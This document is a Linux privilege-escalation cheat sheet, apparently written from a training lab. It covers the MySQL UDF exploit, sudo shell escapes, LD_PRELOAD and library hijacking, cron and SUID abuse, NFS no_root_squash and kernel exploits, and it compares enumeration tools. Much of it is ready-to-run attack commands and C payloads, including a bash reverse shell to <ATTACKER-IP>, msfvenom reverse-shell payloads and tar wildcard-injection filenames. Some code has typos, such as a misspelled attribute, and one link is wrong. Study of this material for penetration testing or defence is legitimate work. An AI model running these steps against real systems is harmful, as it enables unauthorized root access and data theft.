# Linux PrivEsc

### Service Exploits

The MySQL service is running as root and does not have a password assigned. We can use a 
[popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User 
Defined Functions (UDFs) to run system commands as root via the MySQL service.

Compile the raptor_udf2.c exploit code:

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as root

`mysql -u root`

Execute the following commands to create a UDF "do_system" using the compiled exploit

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit MySQL and run /tmp/rootbash with -p to gain a shell running with root privileges

`/tmp/rootbash -p`

### Weak File Permissions: Readable /etc/shadow

If you can read the /etc/shadow file you can take the user's hash you want to crack and use 
john the ripper to crack it.

To crack /etc/shadow hashes you need to `unshadow` it first

`unshadow /etc/passwd OR <USERS-LINE> /etc/shadow OR <USERS-LINE> > unshadowed`

Then crack it with john

`john --wordlist=rockyou.txt unshadowed`

### Weak File Permissions: Writable /etc/shadow

Generate a new password hash

`mkpasswd -m sha-512 <PASSWORD>`

Edit the /etc/shadow file and replace the existing hash with the new one

Login as root with the new password

### Weak File Permissions: Writable /etc/passwd

Generate a new password hash

`openssl passwd <PASSWORD>` or `mkpasswd <PASSWORD>`

Replace the x in the root users row of the /etc/passwd file with the new hash 

Login as root with the new password

Alternatively, copy the root user's row in /etc/passwd and change the username to newroot

Login as newroot with the previously generated password 

### Sudo: Shell Escape Sequences

Use `sudo -l` to list the commands your user can run as super user

1. /usr/sbin/iftop [GTFOBins link](https://gtfobins.github.io/gtfobins/iftop/)

`sudo iftop`
`!/bin/sh`

2. /usr/bin/find [GTFOBins link](https://gtfobins.github.io/gtfobins/iftop/)

`sudo find . -exec /bin/sh \; -quit`

3. /usr/bin/nano [GTFOBins link](https://gtfobins.github.io/gtfobins/nano/)

`sudo nano`
`^R^X`
`reset; sh 1>&0 2>&0`

4. /usr/bin/vim [GTFOBins link](https://gtfobins.github.io/gtfobins/vim/)

`sudo vim -c ':!/bin/sh'`

5. /usr/bin/man [GTFOBins link](https://gtfobins.github.io/gtfobins/man/)

`sudo man man`
`!/bin/sh`

6. /usr/bin/awk [GTFOBins link](https://gtfobins.github.io/gtfobins/awk/)

`sudo awk 'BEGIN {system("/bin/sh")}'`

7. /usr/bin/less [GTFOBins link](https://gtfobins.github.io/gtfobins/less/)

`sudo less /etc/profile`
`!/bin/sh`

8. /usr/bin/ftp [GTFOBins link](https://gtfobins.github.io/gtfobins/ftp/)

`sudo ftp`
`ftp> !/bin/sh`

9. /usr/bin/nmap [GTFOBins link](https://gtfobins.github.io/gtfobins/nmap/)

`TF=$(mktemp)`
`echo 'os.execute("/bin/sh")' > $TF`
`sudo nmap --script=$TF`

`sudo nmap --interactive`
`nmap> !sh`

10. /bin/more [GTFOBins link](https://gtfobins.github.io/gtfobins/more/)

`TERM= sudo more /etc/profile`
`!/bin/sh`

11. /usr/sbin/apache2 Not on GTFOBins 

Use `sudo apache2 -f <FILE>` to view privileged files e.g /etc/shadow for hash cracking

### Sudo: Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Use `sudo -l` to view inherited environment variables (env_keep).

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment.

LD_PRELOAD loads a shared object before any others when a program is run.

LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for 
first.

Create a shared object using the following code as preload.c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD"); 
        setresuid(0,0,0);
        system("/bin/bash -p");
}     
```

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so <PATH>/preload.c`

Run a program you are allowed to run as sudo

`sudo LD_PRELOAD=/tmp/preload.so <PROGRAM-NAME-HERE>`

Run ldd against apache2 to see which shared libraries are used by the program

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed shared libraries using the
code below as library_path.c

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __atribute___((constructor));

void hijack() {
		unsetenv("LD_LIBRARY_PATH");
		setresuid(0,0,0);
		system("/bin/bash -p");
}
```

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run apache32 with sudo and set LD_LIBRARY_PATH to /tmp (where we output the compiled shared 
object)

`sudo LD_LIBRARY_PATH=/tmp apache2`

Try renaming /tmp/libcrypt.so.1 to the name of another shared library

Works:

libuuid.so.1

Doesn't work:

libaprutil-1.so.0 (apache2: symbol lookup error: apache2: undefined symbol: 
apr_bucket_setaside_notimpl)

If we add the undefined functions to the library_path.c file the rename works, e.g

`echo "void apr_bucket_setaside_notimpl(){}" > library_path.c`

### Cron Jobs: File Permissions

View the contents of the system-wide crontab

`cat /etc/crontab`

If you find any cron jobs with elevated privileges that are writable, you can replace the 
contents with a malicious script like a reverse shell

```
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```

### Cron Jobs: PATH Environment Variable

The crontab PATH variable is stored in /etc/crontab

If the PATH has accessible directories that are checked before the location of any cron 
jobs running with elevated privileges you can create a malicious imitation in that 
accessible directory with the same name as the cron job and it will be executed instead

Example:

The PATH in the crontab is:

`/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin `

And the cron job calls overwrite.sh which is located in /usr/local/bin. If another file 
caled overwrite.sh was in the home dir it will be executed instead of the original.

~/overwrite.sh:

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Run `chmod +x ~/overwrite.sh` and the cron job will create a bash shell with the SUID bit 
enabled giving us a root shell in /tmp.

### Cron Jobs: Wildcards

If any cron jobs with elevated privileges run commands with wildcards they can be exploited.

Example:

/usr/local/bin/compress.sh uses tar with a wildcard, [tar on GTFOBins](https://gtfobins.github.io/gtfobins/tar/) shows a shell exploit.

Create an msfvenom payload:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f elf -o shell.elf`

Upload it to the target and `chmod +x shell.elf` 

tar will expand the wildcard and read any file names in /home/user, if there are files 
whose names are valid cli options it will recognise them and treat them as such.

Create two files in /home/user:

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Set up a netcat listener on you attacking machine and wait for the cron job to execute the 
reverse shell

### SUID / SGID Executables: Known Exploits

Find all SUID/GUID executables

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

Check GTFOBins and exploit-db for any exploits

### SUID / SGID Executables: Shared Object Injection

Using `strace <COMMAND> 2<&1` shows the system calls a given command makes. Using grep you 
can look for open/access calls and "no such file" errors:

`strace <COMMAND> 2>&1 | grep -iE "open|access|no such file"`

If a command tries to access a file in an accessible directory you can inject malicious 
shared objects.

Example:

Running `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` shows 
that `suid-so` tries to load the /home/user/.config/libcalc.so shared object

Create the .config directory and compile some shared object code that spawns a bash shell:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /path/to/code/libcalc.c`

Next time `suid-so` is executed a root bash shell is spawned

### SUID / SGID Executables: Environment Variables

If an executable inherits the user's PATH environment variable and doesn't specify absolute 
paths when executing programs it can be exploited.

You can compile malicious code of the same name as the program and add the dir path to the 
PATH variable to spawn a root shell.

Example:

When you run `strings /usr/local/bin/suid-env` you can see suid-env starts apache2 with the 
command `service apache2 start` and doesn't use the absolute path.

service.c:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

Run `gcc -o service /path/to/service.c` to compile and then add the directory containing 
service.c to the PATH environment variable to spawn a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

### SUID / SGID Executables: Abusing Shell Features (#1)

In bash versions <4.2-048 it's possible to define shell functions with names that resemble 
file paths, then export these functions so that they're used instead of any executable at 
that file path.

Example:

/usr/local/bin/suid-env2 runs apache2 with /usr/sbin/service so to get a root shell you can
define a function named /usr/sbin/service and export it:

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

When you run the suid-env2 executable a root shell will spawn.

### SUID / SGID Executables: Abusing Shell Features (#2)

**Does not work on Bash versions >= 4.4**

When in debugging mode Bash uses the PS4 environment variable to display an extra prompt 
for debugging statements.

You can run an executable with bash debugging enabled and the PS4 variable set to an 
embeddded command which creates an SUID version of /bin/bash.

Example:

Run the /usr/local/bin/suid-env2 executable with debugging enabled and the PS4 environment 
variable set:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`

Run `/tmp/rootbash -p` to gain a shell with root privileges.

### Passwords & Keys: History Files

Check the user's history files (`cat ~/.*history | less`) for passwords.

Look out for `-p` and `--password` tags that are joined to other input

### Passwords & Keys: Config Files

Config files often contain passwords in plaintext or other reversible formats.

Example:

ovpn config file containing path to txt file with clear text username and password.

```
user@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt <--- clear text root password
comp-lzo

verb 1

reneg-sec 0
```

### Passwords & Keys: SSH Keys

Check for backups of important files that may be unsecured

Example:

`ls -al /` shows a hidden .ssh directory containg a world readable file root_key which 
appears to be a private SSH key.

Copy the key to your attacking machine and give it the correct permissions with 
`chmod 600 <KEY>` and connect to the box with it:

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<TARGET-IP>`

### NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing 
is enabled, the ID will instead be set to the "nobody" user.

Example:

Check the NFS share configuration on the target:

```
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

/tmp has root squashing disabled

Create a mount point as root on the attacking machine and mount it to the target ip:

```
mkdir /tmp/nfs
mount -o rw,vers=3 <TARGET-IP>:/tmp /tmp/nfs
```

As root on the attacking machine generate a payload with msfvenom and output it to the 
mounted share:

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

As root make the file executable with SUID permissions:

`chmod +xs /tmp/nfs/shell.elf`

On the target execute the file to gain a root shell:

`/tmp/shell.elf`

### Kernel Exploits

Kernel exploits can leave the system in an unstable state, they are a last resort.

The Linux Exploit Suggester 2 will identify potential kernel exploits on the current system.

Example:

Run the Linux Exploit Suggester 2 on the target:

`perl /path/to/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

Compile the code and run it:

```
gcc -pthread /path/to/exploit/c0w.c -o c0w
./c0w
```

Once the exploit completes run `/usr/bin/passwd` to gain a root shell

To restore the original file run:

`mv /tmp/bak /usr/bin/passwd`

### Privilege Escalation Scripts

#### [LinEnum](https://github.com/rebootuser/LinEnum)

Service Exploits: 

- Finds MySQL root login no password

Weak File Permissions: 

- Finds readable /etc/shadow
- Finds writable /etc/shadow and passwd

Sudo: 

- Finds commands with sudo no passwd 
- Finds inherited environment variables

Cron Jobs:

- Finds cron jobs run as root
- Finds the PATH for cron jobs in /etc/crontab 
- Doesn't highlight wildcard vulnerability in compress.sh 

SUID/SGID Executables:

- Finds executables
- Doesn't highlight vulnerabilities of found executables
- Doesn't highlight shared object injection
- Doesn't highlight suid-env inheriting environment variables
- Doesn't highlight abuse of shell features or bash version

Passwords & Keys:

- Finds some history files
- Finds some config files
- Doesn't find SSH key 

NFS:

- Finds NFS config

#### [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Service Exploits: 

- Finds MySQL root nopasswd and highlights

Weak File Permissions: 

- Finds read and write on /stc/shadow
- Finds write on /etc/passwd

Sudo: 

- Finds commands with sudo no passwd 
- Finds inherited environment variables, highlights LD_PRELOAD

Cron Jobs:

- Finds cron jobs running as root
- Finds and highlights PATH environment variable in /etc/crontab

SUID/SGID Executables:

- Finds and highlights known exploits for some binaries
- Finds binaries

Passwords & Keys:

- Finds ovpn config file and path to clear text root credentials 
- Finds .ssh dir in root
- Finds history files

NFS:

- Finds NFS export and highlights no_root_squash

Kernel Exploits:

- Finds exploitable kernel version and highlights

#### [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

Service Exploits: 

- Finds MySQL root nopasswd

Weak File Permissions: 

- Finds read and write on /etc/shadow
- Finds write on etc/passwd

Sudo: 

- Finds commands with sudo no passwd
- Finds inherited environment variables LD_PRELOAD and LD_LIBRARY_PATH

Cron Jobs:

- Finds cron jobs
- Finds writable files executed as cron jobs
- Finds PATH in crontab

SUID/SGID Executables:

- Finds SUID binaries
